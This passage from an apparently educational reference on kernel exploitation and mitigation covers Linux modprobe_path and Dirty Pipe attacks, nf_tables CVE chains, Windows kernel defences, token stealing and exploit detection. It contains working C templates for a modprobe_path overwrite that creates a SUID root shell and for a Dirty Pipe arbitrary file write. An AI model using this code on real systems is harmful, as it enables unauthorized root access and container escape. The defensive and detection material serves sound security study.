`modprobe_path` is a kernel global variable (in `kernel/kmod.c`) containing the path to the `modprobe` binary (default: `/sbin/modprobe`). When the kernel encounters an unknown binary format (a file executed with an unrecognized magic number), it invokes `modprobe` to load the appropriate kernel module. By overwriting `modprobe_path` with the path to an attacker-controlled script (e.g., `/tmp/pwn`), the attacker can cause the kernel to execute their script as root.

The attack sequence: the attacker overwrites `modprobe_path` to `/tmp/pwn`, creates an executable file `/tmp/pwn` containing arbitrary commands (e.g., `chmod 777 /flag`), and then executes a file with an invalid magic number (e.g., a file starting with `\xff\xff\xff\xff`). The kernel tries to load a module handler, invokes `call_modprobe` which executes the binary at the attacker-written path, and the attacker's script runs as root.

This technique is popular because it requires only a single kernel write (overwriting the `modprobe_path` string) and does not involve any function-pointer corruption or ROP chain construction. It is a pure data-only attack that bypasses all CFI mechanisms. The address of `modprobe_path` is at a fixed offset from the kernel text base, computable after KASLR defeat.

`core_pattern` (`/proc/sys/kernel/core_pattern`) is a related target: if the core pattern starts with `|`, the kernel pipes the core dump to the specified program. Overwriting `core_pattern` to `|/tmp/pwn` and triggering a core dump (by crashing a process) causes the kernel to execute the attacker's script. Unlike `modprobe_path`, `core_pattern` is in the `.data` section and may be protected by `__ro_after_init` on some kernel configurations.

**`call_usermodehelper` exploitation**: the kernel function `call_usermodehelper` provides a generic mechanism for running user-space programs from kernel context. It is used by `modprobe_path` invocation internally, but the attacker can also target the function directly by corrupting the `usermodehelper_table` or by calling `call_usermodehelper_exec` through a kernel code-execution primitive with controlled arguments (path, argv, envp). The attacker sets the path to their script and the kernel spawns it as root. This vector works even when `modprobe_path` has been moved to read-only memory, because `call_usermodehelper` accepts its arguments at call time rather than reading from a global variable. However, it requires a code-execution primitive (ROP or function-pointer hijack) rather than a simple data write, making it less attractive than `modprobe_path` when the latter is available.

**Complete modprobe_path exploitation code (C):**

```c
/* modprobe_path overwrite exploitation template.
 * Assumes: KASLR defeated, arbitrary kernel write primitive available.
 * arb_write(addr, data, len) writes 'len' bytes of 'data' to kernel address 'addr'.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

/* These offsets are kernel-version-specific. Obtain from /proc/kallsyms
 * (if kptr_restrict allows) or via KASLR info leak + known offset. */
#define KERNEL_BASE         0xffffffff81000000UL  /* example: after KASLR defeat */
#define MODPROBE_PATH_OFF   0x1844740UL           /* objdump -t vmlinux | grep modprobe_path */

extern void arb_write(unsigned long addr, const void *data, size_t len);

static void overwrite_modprobe_path(unsigned long kbase)
{
    unsigned long modprobe_addr = kbase + MODPROBE_PATH_OFF;
    const char payload_path[] = "/tmp/x";  /* must be <= 256 bytes (KMOD_PATH_LEN) */

    arb_write(modprobe_addr, payload_path, sizeof(payload_path));
}

static void prepare_payload(void)
{
    /* Create the script that will be executed as root by the kernel */
    FILE *f = fopen("/tmp/x", "w");
    fprintf(f, "#!/bin/sh\n");
    fprintf(f, "cp /bin/sh /tmp/rootsh\n");
    fprintf(f, "chmod 04755 /tmp/rootsh\n");
    fclose(f);
    chmod("/tmp/x", 0755);
}

static void trigger_modprobe(void)
{
    /* Create a file with invalid ELF / unknown binfmt magic.
     * When executed, the kernel calls request_module("binfmt-XXXX")
     * which invokes the binary at modprobe_path. */
    FILE *f = fopen("/tmp/dummy", "w");
    fwrite("\xff\xff\xff\xff", 1, 4, f);  /* invalid magic */
    fclose(f);
    chmod("/tmp/dummy", 0755);

    /* Execute triggers call_modprobe → our payload runs as root */
    system("/tmp/dummy");

    /* If successful, /tmp/rootsh is a SUID root shell */
    system("/tmp/rootsh");
}

/* Alternative: core_pattern overwrite for persistence.
 * core_pattern supports piping: if it starts with "|", the kernel
 * pipes the core dump to the specified program as root. */
static void overwrite_core_pattern(unsigned long kbase)
{
    /* core_pattern is at a known offset in .data */
    unsigned long core_pattern_addr = kbase + 0x1844600UL;  /* example offset */
    const char payload[] = "|/tmp/x";
    arb_write(core_pattern_addr, payload, sizeof(payload));
}

static void trigger_core_dump(void)
{
    /* Fork a child that crashes, generating a core dump */
    if (fork() == 0) {
        /* Dereference NULL to trigger SIGSEGV → core dump → our script */
        *(volatile int *)0 = 0;
    }
}

/* Alternative: poweroff_cmd overwrite for delayed execution.
 * The kernel invokes poweroff_cmd on orderly_poweroff().
 * Useful when modprobe_path is __ro_after_init but poweroff_cmd is not. */
static void overwrite_poweroff_cmd(unsigned long kbase)
{
    unsigned long poweroff_cmd_addr = kbase + 0x1844800UL;  /* example offset */
    const char payload[] = "/tmp/x";
    arb_write(poweroff_cmd_addr, payload, sizeof(payload));
    /* Trigger: echo o > /proc/sysrq-trigger  or  reboot(RB_POWER_OFF) */
}
```

Finding the offset in practice: if `/proc/kallsyms` is readable (which `kptr_restrict=0` allows, or if the attacker has `CAP_SYSLOG`), `grep modprobe_path /proc/kallsyms` directly yields the address. On hardened systems where `kptr_restrict=2`, the attacker uses the KASLR info leak to determine the kernel base, then adds the static offset obtained from the target kernel's `vmlinux` or `System.map` (which can be extracted from the installed kernel package).

An increasingly important variant targets `poweroff_cmd` (the kernel global that specifies the binary invoked on shutdown/reboot). Overwriting `poweroff_cmd` with an attacker's path and then triggering a reboot (via `reboot(2)` or `echo b > /proc/sysrq-trigger`) executes the attacker's binary. This target is useful when `modprobe_path` has been hardened but `poweroff_cmd` has not — as of Linux 6.5, `poweroff_cmd` is not `__ro_after_init` in the mainline kernel.

### 8.5 Dirty Pipe (CVE-2022-0847): case study

Dirty Pipe is an instructive case study because it achieved arbitrary file write as an unprivileged user without any kernel memory corruption — it exploited a logic bug in the kernel's pipe and page-cache interaction.

The vulnerability: the `splice` syscall allows zero-copy data transfer between a pipe and a file by sharing page-cache pages. The bug was in the `copy_page_to_iter_pipe` function and related code: when a pipe buffer referenced a page-cache page, the `PIPE_BUF_FLAG_CAN_MERGE` flag was not properly cleared. This flag indicates that subsequent writes to the pipe can append data to the existing buffer (merging data into the same page) rather than allocating a new buffer. Because the flag was incorrectly set on page-cache pages, a subsequent `write` to the pipe would merge the written data into the page-cache page, overwriting file content in-place.

The exploit:
1. Open the target file (e.g., `/etc/passwd`) for reading.
2. Create a pipe and fill it completely with data (to initialize the `PIPE_BUF_FLAG_CAN_MERGE` flag on all pipe buffers).
3. Drain the pipe (read all data, freeing the pipe buffers).
4. Use `splice` to transfer one byte from the target file into the pipe. This places a page-cache page reference in the pipe buffer, but the `PIPE_BUF_FLAG_CAN_MERGE` flag is incorrectly retained from the previous buffer.
5. Write the desired overwrite data to the pipe. Because `PIPE_BUF_FLAG_CAN_MERGE` is set, the write merges into the page-cache page, overwriting the file content after the `splice`d byte.

The overwritten data is immediately visible to all processes that read the file (because the page cache is shared). The attacker can overwrite `/etc/passwd` to add a root-shell entry, overwrite SUID binaries, or modify system configuration files.

Dirty Pipe bypasses all kernel mitigations — KASLR, SMEP, SMAP, KPTI, SELinux (the attacker opens the file for reading, which is permitted; the write occurs through the pipe interface, which SELinux does not restrict in this context). It is a pure logic bug that does not involve memory corruption, making it invisible to memory-safety defenses like MTE or KASAN. The fix (Linux 5.16.11, 5.15.25) properly clears `PIPE_BUF_FLAG_CAN_MERGE` when a page-cache page is spliced into a pipe.

**Root cause detail.** The bug is in `copy_page_to_iter_pipe()` (and the related `push_pipe()` helper) in `lib/iov_iter.c`. When `splice` moves a page-cache page into a pipe buffer, the kernel initializes a `struct pipe_buffer` entry with the page reference, offset, and length. The critical field is `flags`. Pipe buffers allocated by normal `write()` operations have `PIPE_BUF_FLAG_CAN_MERGE` set, which tells subsequent `pipe_write()` calls that they may append data into the same buffer page rather than allocating a new one. The bug: `copy_page_to_iter_pipe()` copies the `flags` field from the previous pipe-buffer entry (which was allocated by the fill-and-drain step and retains `PIPE_BUF_FLAG_CAN_MERGE`) into the new entry that references the page-cache page. The flag should be cleared for any buffer that references a page-cache page, because merging into a page-cache page modifies file content.

**Exploitation code (annotated C):**

```c
/* CVE-2022-0847 - Dirty Pipe exploitation template
 * Overwrites arbitrary offset in a read-only file.
 * Requires: Linux 5.8 - 5.16.10, 5.15.0 - 5.15.24
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Overwrite 'data' at 'offset' in file at 'path' (read-only for caller) */
int dirty_pipe_write(const char *path, off_t offset, const char *data, size_t len)
{
    if (offset % getpagesize() == 0) {
        fprintf(stderr, "offset must not be page-aligned (splice needs >= 1 byte)\n");
        return -1;
    }

    int fd = open(path, O_RDONLY);
    if (fd < 0) { perror("open target"); return -1; }

    int pfd[2];
    if (pipe(pfd) < 0) { perror("pipe"); return -1; }

    /* Step 1: Fill the entire pipe to initialize PIPE_BUF_FLAG_CAN_MERGE
     * on all pipe_buffer entries. */
    unsigned pipe_sz = fcntl(pfd[1], F_GETPIPE_SZ);
    char *buf = malloc(pipe_sz);
    memset(buf, 'A', pipe_sz);
    write(pfd[1], buf, pipe_sz);

    /* Step 2: Drain the pipe. Buffers are freed, but the flag state
     * persists in the ring metadata for re-use. */
    read(pfd[0], buf, pipe_sz);

    /* Step 3: Splice one byte from the target file at (offset - 1).
     * This places a page-cache page into the pipe buffer.
     * BUG: PIPE_BUF_FLAG_CAN_MERGE is NOT cleared. */
    off_t splice_off = offset - 1;  /* splice reads 1 byte before our target */
    ssize_t nbytes = splice(fd, &splice_off, pfd[1], NULL, 1, 0);
    if (nbytes <= 0) { perror("splice"); return -1; }

    /* Step 4: Write our payload. Because CAN_MERGE is set, pipe_write()
     * appends directly into the page-cache page, overwriting file content
     * starting at 'offset'. */
    ssize_t written = write(pfd[1], data, len);
    if (written != (ssize_t)len) { perror("write"); return -1; }

    free(buf);
    close(pfd[0]); close(pfd[1]); close(fd);
    return 0;
}
```

**SUID binary overwrite technique.** Rather than modifying `/etc/passwd`, a stealthier approach overwrites a SUID binary (e.g., `/usr/bin/su`) with a payload that spawns a root shell. The attacker splices into the SUID binary at an offset past the ELF header, overwrites the `.text` entry point with shellcode that calls `setuid(0); execve("/bin/sh", ...)`, and executes the corrupted SUID binary. Because the overwrite is in the page cache, it persists until the page is evicted or the system is rebooted, but it does not modify the on-disk file (the page cache is dirty but will not be written back to a read-only filesystem). On read-write filesystems, the corrupted page may be written back, creating persistent modification.

**Container escape variant.** Dirty Pipe is effective for container escape because the page cache is shared between the host and all containers. A containerized process can open a host-visible file (e.g., a file bind-mounted into the container, or a file on a shared volume) for reading and use Dirty Pipe to overwrite its contents. If the target file is a host SUID binary or a host configuration file, the overwrite escapes the container's filesystem isolation. The attack does not require any capabilities beyond basic file read access and pipe operations, neither of which are restricted by default Docker seccomp profiles.

Detection: Dirty Pipe exploitation leaves no kernel crash artifacts. The primary detection signal is file integrity monitoring (FIM): detecting unexpected modifications to sensitive files (`/etc/passwd`, `/etc/shadow`, SUID binaries). Additionally, the exploit requires a specific sequence of `pipe`/`splice`/`write` syscalls that can be detected via syscall auditing (auditd rules for `splice` followed by `write` to the same pipe fd).

### 8.6 CVE-2023-32233 (nf_tables use-after-free): case study in cross-cache exploitation

CVE-2023-32233 is a use-after-free in the Netfilter nf_tables subsystem, triggered by specific batch operations that remove anonymous sets while references to them still exist. The vulnerability is in the `nft_set_elem_destroy` function, which can be reached after the set has already been freed.

The exploit demonstrates a modern cross-cache chain on a fully-hardened 6.x kernel (KASLR + SMEP + SMAP + KPTI):

Stage 1 — Information leak: the exploit uses a separate, smaller information-leak bug (or the UAF itself in a first pass) to leak a kernel text pointer from a freed `nft_set` object. The freed object's memory, when reclaimed by a `msg_msg` allocation (elastic object, same size class), has its contents read back via `msgrcv`, providing the leaked pointer. This defeats KASLR.

Stage 2 — Cross-cache UAF to arbitrary write: the exploit frees the `nft_set` object, reclaims its memory with a controlled `msg_msg` allocation (by sending a System V message whose total allocation size matches the target slab cache), and then uses the dangling `nft_set` reference to write to fields within the `msg_msg` header. By corrupting the `msg_msg.m_ts` (message text size) and `msg_msg.next` (pointer to the next message segment) fields, the attacker creates an out-of-bounds read/write primitive through `msgrcv` and `msgsnd`.

Stage 3 — Privilege escalation: with the arbitrary-write primitive established through the corrupted `msg_msg`, the exploit overwrites `modprobe_path` to point to an attacker-controlled script, triggers execution of an unknown binary format, and the attacker's script runs as root.

This exploit chain is notable because it works entirely through data-only manipulation — no function pointers are corrupted, no ROP chain is constructed, and kernel CET (if present) is irrelevant. The cross-cache technique is general enough to apply to many UAF vulnerabilities, making it a template for modern kernel exploitation.

### 8.7 CVE-2024-1086 (nf_tables double-free): case study in page-level manipulation

CVE-2024-1086, discovered by Notselwyn in early 2024, is a double-free in the Netfilter nf_tables verdict handling. The `nft_verdict_init` function fails to properly handle reference counting on certain verdict types, allowing a set element's verdict data to be freed twice.

The exploit is remarkable for its reliability (near-100% success rate on tested configurations) and its use of page-level manipulation techniques:

Stage 1 — The exploit triggers the double-free to gain two references to the same physical page in the page allocator. One reference is allocated to a PTE page (a page used by the kernel's page-table infrastructure), and the other is allocated to a user-controlled buffer via `mmap`/`mprotect`. This gives the attacker direct write access to page-table entries — through the user-mapped reference, the attacker modifies PTEs in the PTE page.

Stage 2 — By manipulating PTEs, the attacker maps arbitrary physical memory into their process's virtual address space. The attacker maps the physical pages containing the kernel text, kernel data, and the current task's `struct cred`. This bypasses KASLR entirely (the attacker does not need to know virtual addresses because they operate at the physical level through their controlled PTE page).

Stage 3 — The attacker reads the kernel's credential structures through the physical mapping, locates their own `struct cred`, and overwrites the UID/GID/capability fields to achieve root. SMEP and SMAP are irrelevant (the attacker modifies data through a user-space mapping to physical memory, not through kernel code execution). KPTI is irrelevant (the attacker modifies physical memory directly, not through the kernel's page table).

Detection: this exploit manipulates page-table entries, which can be detected by monitoring for unexpected changes to page-table pages (LKRG's page-table integrity checks, or eBPF programs monitoring `mm_struct` modifications). The double-free itself can be detected by slab allocation monitoring (detecting the same object address being freed twice from `kmem_cache_free`).

---

## 9. Windows kernel mitigations

### 9.1 Windows kASLR

Windows Kernel ASLR randomizes the base address of `ntoskrnl.exe`, `hal.dll`, and boot-loaded drivers at each boot. The randomization entropy is approximately 8-10 bits (the kernel base is aligned to a large boundary within a 2 GiB window). Windows kASLR was introduced in Windows Vista (2007) and has been incrementally hardened.

Windows kASLR bypass follows patterns similar to Linux: information leaks via driver IOCTLs (returning kernel addresses in output buffers), `NtQuerySystemInformation` with `SystemBigPoolInformation` or `SystemModuleInformation` classes (which return kernel module base addresses — restricted to administrative users since Windows 10 1607), and side-channel attacks (branch predictor, TLB timing).

Specific Windows kASLR bypass vectors that remain relevant on recent Windows versions include: GDI object address leakage through `NtGdiGetDIBitsInternal` (various historical CVEs in the `win32k.sys` display driver subsystem have leaked kernel pool addresses through GDI object metadata returned to user space), large-pool allocation address prediction (the kernel's large pool allocation pattern is partially deterministic — objects above a certain size threshold are allocated from a separate pool whose base address can be partially inferred from user-observable side effects), and driver-specific leaks (third-party drivers frequently return uninitialized stack or pool data through IOCTL output buffers, leaking kernel addresses; Microsoft's Static Driver Verifier and Driver Verifier runtime checks catch some of these, but the attack surface grows with each installed driver). In Windows 11 24H2, Microsoft further hardened `NtQuerySystemInformation` by requiring elevated privileges for additional information classes, but side-channel approaches remain architecture-dependent and are not fully mitigated by software.

### 9.2 SMEP and SMAP on Windows

Windows enables SMEP (from Windows 8 on compatible hardware) and SMAP (from Windows 10 21H1) in the kernel. The CR4 bits are set during boot and pinned by PatchGuard (§9.8). The kernel uses `STAC`/`CLAC` in its user-space access functions (`ProbeForRead`, `ProbeForWrite`, `MmCopyMemory`) to temporarily disable SMAP.

SMEP bypass on Windows follows the same patterns as Linux: CR4 modification via ROP (calling `nt!KiConfigureDynamicProcessor` or using raw `mov cr4, rax` gadgets) or page-table manipulation (modifying the PTE for a user-space page to mark it as supervisor).

### 9.3 Kernel Data Protection (KDP)

KDP, introduced in Windows 10 20H1 (2020), uses the hypervisor (VBS) to protect critical kernel data structures from modification. Protected data is marked as read-only by the hypervisor, and any kernel-mode write to these pages generates a second-level page fault handled by the hypervisor, which terminates the kernel (bugcheck).

KDP protects: the system service table (SSDT), certain global configuration variables, driver dispatch tables (after initialization), and security-critical data structures. The protection is enforced below the kernel's privilege level (by the hypervisor), making it effective even against an attacker with arbitrary kernel memory write — the write is intercepted by the hypervisor before it modifies the protected page.

KDP bypass requires compromising the hypervisor itself (escaping VBS — extremely difficult, as the hypervisor has a minimal attack surface) or finding a code path that modifies the protected data through the hypervisor's own update interface (the `VslpEnterIumSecureMode` or `HvCallModifyVtlProtectionMask` hypercalls).

### 9.4 VBS and HVCI

Virtualization-Based Security (VBS) uses the Windows Hypervisor (Hyper-V) to create an isolated virtual trust level (VTL 1) that is separate from the normal kernel (VTL 0). The Secure Kernel runs in VTL 1 and enforces security policies that the normal kernel cannot override.

HVCI (Hypervisor-Protected Code Integrity) is a VBS feature that enforces code integrity for the kernel: all kernel-mode code must be signed, and the hypervisor prevents the creation of executable pages from unsigned memory (W^X is enforced by the hypervisor, not just by the kernel's own page-table management). This prevents kernel ROP chains from executing shellcode from attacker-controlled memory — the attacker cannot make a writable page executable because the hypervisor intercepts the page-table modification.

HVCI impact on exploitation: with HVCI, the attacker cannot use `VirtualAlloc`/`ZwAllocateVirtualMemory` to create RWX kernel pages, cannot modify existing kernel page-table entries to add the NX bit without hypervisor approval, and cannot write to kernel code pages. The attacker is restricted to data-only attacks or to calling existing kernel functions via their signed addresses (ROP using existing signed code).

### 9.5 Kernel CFI and Kernel CET on Windows

Windows 11 implements Kernel CFI (kCFI) using CET IBT: all kernel-mode indirect branches must land on `ENDBR64` instructions. Kernel modules loaded by the Windows loader are verified for CET compatibility, and non-compliant modules are rejected when Kernel CET is active.

Kernel Shadow Stack (Kernel CET SHSTK) protects kernel return addresses using the hardware shadow stack. This is enabled on Windows 11 22H2+ on compatible hardware (Intel 12th-gen+, AMD Zen 3+). Kernel Shadow Stack prevents kernel ROP by detecting return-address corruption on every `ret` instruction in kernel mode.

### 9.6 Credential Guard

Credential Guard uses VBS to isolate credential material (NTLM hashes, Kerberos TGTs) in a separate VTL 1 process (LsaIso.exe). Even if the attacker achieves kernel compromise in VTL 0, they cannot access credential material in VTL 1 because the hypervisor enforces memory isolation between VTLs. This is the defense against credential-dumping attacks (Domain 14) that target LSASS memory.

### 9.7 Secure Kernel

The Secure Kernel (securekernel.exe) runs in VTL 1 and provides services to VTL 0 via hypercalls. It manages secure memory, enforces code integrity (HVCI), and hosts secure processes (trustlets). The Secure Kernel has a minimal attack surface: it does not process user input directly, does not load arbitrary drivers, and communicates with VTL 0 only through a defined hypercall interface.

Compromising the Secure Kernel requires exploiting a vulnerability in the hypercall interface or in the Secure Kernel's own code — a significantly harder target than compromising the normal kernel.

### 9.8 PatchGuard (KPP)

PatchGuard (Kernel Patch Protection) is a Windows kernel integrity monitoring system that periodically checks the integrity of critical kernel structures: the system service dispatch table (SSDT), the interrupt descriptor table (IDT), the global descriptor table (GDT), kernel code pages, and certain MSRs. If PatchGuard detects modification, it triggers a blue screen (bugcheck `CRITICAL_STRUCTURE_CORRUPTION`, code 0x109).

PatchGuard runs on a randomized timer (checking at unpredictable intervals, typically every 5-10 minutes), making it a probabilistic defense — an attacker who modifies a protected structure and restores it before the next check may evade detection. The randomized timing prevents the attacker from reliably predicting the check window.

PatchGuard bypass: historical techniques included hooking the PatchGuard timer callback (to prevent the check from running), finding and disabling the PatchGuard check context (by scanning kernel memory for the PatchGuard data structures and nullifying them), and exploiting race conditions in the check logic. Microsoft has iteratively hardened PatchGuard against these techniques, obfuscating the PatchGuard code and data (the PatchGuard check routines are encrypted in memory and decrypted only during execution), randomizing the check entry points (the timer callback address changes each boot), and adding integrity checks on the PatchGuard check routines themselves (a meta-check that verifies the check code has not been tampered with).

The "GhostHook" technique (CyberArk, 2017) demonstrated PatchGuard bypass through Intel Processor Trace (PT): by installing a custom PT exception handler that intercepts the PatchGuard check routine before it completes, the attacker can modify protected structures and restore them within the check window. Microsoft responded by monitoring PT configuration as part of PatchGuard's check set. The cat-and-mouse nature of PatchGuard bypass illustrates the fundamental limitation of same-privilege-level integrity monitoring: the monitor and the adversary operate at the same privilege level, so any technique the monitor uses, the adversary can subvert. HyperGuard (§11.6) resolves this by elevating the monitor above the kernel's privilege level.

---

## 10. Windows kernel bypass techniques

### 10.1 Data-only attacks against EPROCESS/TOKEN

With HVCI and Kernel CET enabled, control-flow hijack in the Windows kernel is extremely difficult. Modern Windows kernel exploits therefore focus on data-only attacks — modifying kernel data structures without ever corrupting a code pointer.

The primary target is the `_EPROCESS` structure (the kernel object representing a process) and its associated `_TOKEN` (the security token that defines the process's privileges). The attacker modifies the `_SEP_TOKEN_PRIVILEGES` structure within the token to grant all privileges (`SeDebugPrivilege`, `SeLoadDriverPrivilege`, `SeTcbPrivilege`, etc.). Alternatively, the attacker replaces the token pointer in the exploit's `_EPROCESS` with a copy of the SYSTEM process's token (a technique known as token stealing).

The token-stealing attack:
1. Locate the `_EPROCESS` for the System process (PID 4) by walking the `ActiveProcessLinks` doubly-linked list from any known `_EPROCESS`.
2. Read the `Token` field from the System process's `_EPROCESS`.
3. Write the System token value into the attacker's process's `_EPROCESS.Token` field.

After the token replacement, the attacker's process runs with SYSTEM privileges. This is a pure data-only attack: no function pointers are corrupted, no code is executed, and no CFI check is triggered. HVCI and Kernel CET are irrelevant. KDP protects some kernel data structures but does not protect `_EPROCESS.Token` (because the token pointer must be modifiable for legitimate operations like impersonation).

### 10.2 HVCI bypass via signed code gadgets

HVCI prevents unsigned code execution but does not prevent calling existing signed kernel functions with controlled arguments (the equivalent of userspace ROP). An attacker can construct a chain of calls to legitimate kernel functions that achieve the desired effect (e.g., calling `ExAllocatePool` to allocate memory, `RtlCopyMemory` to copy data, and `ZwSetInformationProcess` to modify process attributes).

With Kernel CET shadow stack active, traditional ROP chains fail. However, the attacker can use JOP-style chains (using `jmp`/`call` through function pointers rather than `ret`), or simply use data-only attacks (which don't require any control-flow hijack).

In practice, the most common HVCI bypass is to avoid code execution entirely and use data-only techniques. The token-stealing attack (§10.1) is the canonical example. Other data-only attacks include modifying the `_OBJECT_HEADER.SecurityDescriptor` of a privileged object to grant the attacker access, modifying the `_EPROCESS.InheritedFromUniqueProcessId` field to reparent a process under a privileged ancestor, and corrupting the `_ALPC_PORT` structure's security attributes to gain access to a privileged ALPC endpoint. Each of these attacks achieves privilege escalation through data modification without ever corrupting or hijacking a code pointer.

For scenarios where code execution is required (e.g., loading a rootkit or installing a persistent backdoor), the attacker can chain HVCI-compliant techniques: find a signed kernel driver with a known vulnerability (a "bring your own vulnerable driver" or BYOVD attack), load the driver through normal driver-loading mechanisms (which HVCI permits because the driver is legitimately signed), and exploit the driver's vulnerability to achieve the desired primitive. The BYOVD vector is particularly pernicious because HVCI verifies that loaded code is signed but does not evaluate whether the code is free of exploitable bugs. Microsoft maintains a Vulnerable Driver Block List (updated via Windows Update) to mitigate known BYOVD vectors, but the list is inherently reactive — new vulnerable signed drivers are discovered regularly.

### 10.3 VBS bypass research

VBS relies on the hardware virtualization extensions (Intel VT-x, AMD-V) and the Hyper-V hypervisor for isolation. Bypassing VBS requires one of three categories of attack.

A hypervisor vulnerability: a bug in Hyper-V's hypercall handling, virtual device emulation, or inter-VTL communication that allows VTL 0 code to execute in VTL 1 or access VTL 1 memory. These are rare and extremely high-value vulnerabilities. Microsoft offers significant bounties for Hyper-V escapes ($250,000+). Historical examples include CVE-2020-0904 (Hyper-V denial of service through crafted hypercalls) and CVE-2021-28476 (Hyper-V remote code execution through the vmswitch component's handling of OIDs — a guest-to-host escape that, in the VBS context, would correspond to a VTL 0-to-VTL 1 escalation). While CVE-2021-28476 was primarily a guest-escape bug in Hyper-V's virtual switch, it demonstrated that the hypervisor's attack surface extends beyond pure hypercall handling to include virtual device emulation — a larger and more complex codebase with more room for bugs.

A hardware vulnerability: a CPU bug that bypasses hardware virtualization isolation. Research has demonstrated that certain speculative execution variants can leak data across VTL boundaries. TLBleed (2018) showed that TLB sharing between hyperthreads on the same core can leak memory access patterns across VTLs. CrossTalk (2020) demonstrated that some Intel CPUs share staging buffers across cores, enabling data leakage between any two execution contexts on the same machine — including across VTL boundaries. While practical exploits against VBS via these channels are extremely difficult (the attacker must not only leak data but interpret it usefully and overcome noise), they demonstrate that hardware isolation is not absolute.

A configuration weakness: if VBS is enabled but HVCI is not, the attacker can achieve kernel code execution and then interact with the hypervisor through undocumented interfaces. If Secure Boot is not enabled alongside VBS, an attacker with physical access can boot a modified hypervisor. If the hypervisor's debug interfaces are not locked down (e.g., `bcdedit /set hypervisordebug on`), an attacker with physical access can attach a debugger to the hypervisor. Microsoft's recommended configuration enables VBS + HVCI + Secure Boot + Credential Guard as a complete stack; organizations that enable VBS without the full stack leave residual attack surface.

---

## 11. Detection of kernel exploitation

### 11.1 Anomalous privilege transitions

The most direct indicator of kernel privilege escalation is an unexpected change in a process's credentials or token. On Linux, the kernel audit subsystem can monitor `setuid`, `setgid`, `capset`, and credential changes via audit rules. A process that transitions from a non-root UID to UID 0 without going through a legitimate privilege-transition path (a SUID binary, `su`, `sudo`, `pkexec`) is highly anomalous.

eBPF-based monitoring can attach to the `commit_creds` kernel function and log every credential change, along with the calling context (the return address chain). A `commit_creds` call from an unexpected kernel code path (not originating from a legitimate authentication subsystem) indicates exploitation.

On Windows, the Event Log records privilege changes, token manipulation, and security attribute modifications. The ETW provider `Microsoft-Windows-Security-Auditing` logs Event IDs 4672 (special privileges assigned to new logon) and 4673 (privileged service called). An unexpected Event 4672 from a process that should not have elevated privileges is an alert trigger.

### 11.2 Credential structure monitoring

On Linux, LKRG (Linux Kernel Runtime Guard) periodically checksums the `struct cred` of every running task and compares it against the expected values. If a `cred` structure is modified outside of the legitimate `commit_creds` path (e.g., by a direct memory write), LKRG detects the modification and optionally kills the offending process or triggers a kernel panic.

LKRG also monitors `cred` reference counts: a credential structure with an unexpected reference count (e.g., a recently-created credential with usage count 1 that is not associated with a known authentication event) may indicate exploitation.

eBPF-based cred monitoring: an eBPF program attached to the `cred_jar` slab cache can monitor allocations from and deallocations to the credential cache, correlating them with `prepare_kernel_cred` calls. An allocation from `cred_jar` that is not preceded by a legitimate authentication call (from `sys_setuid`, `sys_setgid`, PAM, etc.) is suspicious.

### 11.3 Crash dump analysis

Kernel exploits that involve ROP chains, heap spray, or page-table manipulation often leave artifacts in crash dumps (if the exploit triggers a kernel panic, which unreliable exploits frequently do):

ROP chain artifacts: the kernel stack at the time of the crash contains a sequence of kernel addresses that correspond to short gadgets (1-5 instructions each) followed by the next gadget's address. This pattern is distinctive and can be automatically detected by crash-dump analysis tools.

Heap spray artifacts: SLUB freelists containing many identical objects (the spray pattern) are visible in crash dumps. Normal kernel heap state shows diverse object types; a slab page filled with identical `msg_msg` headers or `pipe_buffer` structures indicates heap manipulation.

Page-table corruption: modified PTEs (pages marked as supervisor-mode that should be user-mode, or writable pages in the kernel text region) are visible in crash dumps and indicate exploitation attempts.

**Cross-cache attack artifacts**: a slab page's `page->slab_cache` pointer references the owning `kmem_cache`. During a cross-cache attack, the attacker frees all objects in a slab page so it is returned to the page allocator, then reclaims it in a different slab cache. If the exploit crashes mid-chain, the crash dump shows a page whose `slab_cache` pointer references an unexpected cache (e.g., a page containing `msg_msg` objects whose `slab_cache` still references the original vulnerable cache). This inconsistency is a strong indicator of cross-cache exploitation.

**Pipe buffer manipulation artifacts**: exploits that target `struct pipe_buffer` (§8.3 elastic objects, §8.5 Dirty Pipe) leave distinctive patterns: `pipe_buffer` entries with `flags` containing `PIPE_BUF_FLAG_CAN_MERGE` set for pages that should not be mergeable (file-backed pages), or `pipe_buffer.ops` pointers that reference unexpected operations tables. In the Dirty Pipe case, the `ops` pointer is the normal `anon_pipe_buf_ops`, but the flags field has been manipulated to include `PIPE_BUF_FLAG_CAN_MERGE` — a combination that never occurs in normal pipe operation.

The `crash` utility (on Linux) and WinDbg (on Windows) can perform these analyses. Automated crash-dump triage scripts can flag the indicators described above. For Linux, the `crash` extension `slub_debug.py` (various community implementations) walks slab caches and reports anomalies: freelists with corrupted pointers, objects with unexpected metadata, and caches with mismatched page counts. For Windows, WinDbg's `!pool` and `!poolval` commands inspect pool allocations for corruption, and the `!token` command compares token objects against expected values. Microsoft's `kdstackflow` extension performs automated crash-stack analysis to identify ROP chain patterns in the exception stack.

### 11.4 eBPF-based runtime detection

eBPF programs can implement real-time kernel exploit detection:

**Function call monitoring**: kprobes on sensitive functions (`commit_creds`, `prepare_kernel_cred`, `call_usermodehelper`, `do_execveat_common`) log the calling context and return-address chain. Calls from unexpected kernel code paths trigger alerts.

**Slab cache monitoring**: tracepoints on slab allocation events (`kmem_cache_alloc`, `kmem_cache_free`) can detect cross-cache attack patterns: a slab page being freed and reallocated to a different cache in rapid succession.

**Module loading monitoring**: kprobes on `load_module` detect unexpected kernel module loads, which may indicate a kernel exploit loading a rootkit module.

**CR4 monitoring**: tracepoints on CR4 writes (via `native_write_cr4`) detect attempts to disable SMEP/SMAP. A CR4 write that clears bit 20 or 21 is a critical alert.

Cilium's Tetragon project provides production-ready eBPF-based security observability, including kernel function call tracing with configurable alert policies. Tetragon's `TracingPolicy` custom resource allows defining kprobe-based policies declaratively — an operator can deploy a policy that monitors `commit_creds` calls and checks whether the caller's return address falls within expected kernel code paths (PAM authentication, `sys_setuid`, `sys_capset`). Calls from unexpected code paths (arbitrary kernel addresses, module regions, BPF JIT regions) are flagged as exploitation indicators with severity proportional to the caller's anomalousness.

